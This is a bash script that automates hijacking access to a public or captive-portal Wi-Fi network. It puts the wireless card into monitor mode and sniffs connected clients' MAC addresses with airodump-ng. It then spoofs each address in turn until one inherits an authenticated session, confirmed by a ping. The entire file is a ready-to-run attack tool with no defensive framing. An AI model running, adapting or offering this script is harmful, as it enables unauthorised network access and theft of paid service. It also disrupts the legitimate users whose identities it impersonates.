#!/bin/bash

# Usage: ./minpublicfi.sh [interface] [essid]
interface="${1:-wlan0}"
essid="${2:-PubFi}"
mac_list="/tmp/macs.txt"

# Put interface in monitor mode
monitor_mode() {
    echo "Setting monitor mode..."
    nmcli dev set "$interface" managed no
    sudo ip link set "$interface" down
    sudo iw "$interface" set type monitor
    sudo ip link set "$interface" up
}

# Get connected MACs
scan_macs() {
    echo "Scanning for connected clients..."
    sudo airodump-ng "$interface" --essid "$essid" -a --output-format csv -w "/tmp/scan" &
    pid=$!
    sleep 15
    kill $pid
    
    # Extract MACs
    grep -v "Station MAC" "/tmp/scan-01.csv" 2>/dev/null | grep -v "^$" | cut -d, -f1 > "$mac_list"
    echo "Found $(wc -l < $mac_list) MAC addresses"
}

# Change MAC and connect
try_connect() {
    local mac="$1"
    echo "Trying MAC: $mac"
    
    # Set managed mode with new MAC
    sudo ip link set "$interface" down
    sudo iw "$interface" set type managed
    sudo ip link set "$interface" address "$mac"
    sudo ip link set "$interface" up
    nmcli dev set "$interface" managed yes
    
    # Connect to network
    nmcli device wifi connect "$essid"
    sleep 5
    
    # Check internet
    if ping -c 1 8.8.8.8 >/dev/null 2>&1; then
        echo "Internet connection successful with MAC: $mac"
        return 0
    else
        echo "No internet connection with MAC: $mac"
        return 1
    fi
}

# Main execution
monitor_mode
scan_macs

if [ ! -s "$mac_list" ]; then
    echo "No MACs found. Exiting."
    exit 1
fi

# Try each MAC
while read mac; do
    try_connect "$mac"
    if [ $? -eq 0 ]; then
        echo "Success! Connected with MAC: $mac"
        break
    fi
    
    read -p "Continue with next MAC? (y/n): " choice
    if [ "$choice" != "y" ]; then
        break
    fi
done < "$mac_list"

# Cleanup
rm -f "/tmp/scan-01.csv" "$mac_list"
echo "Done."
